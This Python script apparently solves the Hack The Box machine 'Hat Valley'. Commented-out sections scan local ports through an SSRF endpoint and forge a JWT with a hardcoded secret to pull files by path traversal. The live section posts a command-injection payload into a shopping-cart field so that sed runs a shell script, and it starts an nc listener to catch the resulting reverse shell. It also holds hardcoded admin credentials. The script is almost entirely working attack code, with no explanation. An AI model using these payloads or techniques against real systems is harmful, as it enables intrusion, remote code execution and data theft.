import urllib3
import sys
import requests
import jwt
import subprocess, time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

'''
# Automate SSRF to find port 3002
session = requests.Session()

url = 'http://hat-valley.htb'

ssrfURL = url + '/api/store-status'

for i in range(70,9000):

    socket = '"http://127.0.0.1:' + str(i) + '"'
    param = {'url' : socket}
    r = session.get(ssrfURL, verify=False, proxies=proxies, params=param)

    if len(r.content) != 0:
        print("Found local port on:", socket)

'''
'''
# Generate jwt to perform LFI
secret = '123beany123'
username = f"/' {sys.argv[1]} '/"
jwt_token = jwt.encode({'username': username, "iat": 1678978439}, secret, algorithm='HS256')
cookie = {'token': jwt_token}
r = requests.get('http://hat-valley.htb/api/all-leave', cookies=cookie, proxies=proxies)

with open("bean_backup_final.tar.gz", "wb") as f:
    f.write(r.content)

'''
# print(r.content)

# Command Injection on www-data
header = {'Authorization': 'Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A='}

addItem = {
    "item":"1",
    "user":"hacker",
    "action":"add_item"
}

r = requests.post('http://store.hat-valley.htb/cart_actions.php', headers=header, proxies=proxies, data=addItem)

data = {
    "item":"1/' -e \"1e /dev/shm/shell.sh\" '",
    "user":"hacker",
    "action":"delete_item"
}

nc_listener = subprocess.Popen(["nc","-nvlp","1337"])
time.sleep(1)

r = requests.post('http://store.hat-valley.htb/cart_actions.php', headers=header, proxies=proxies, data=data)

nc_listener.wait()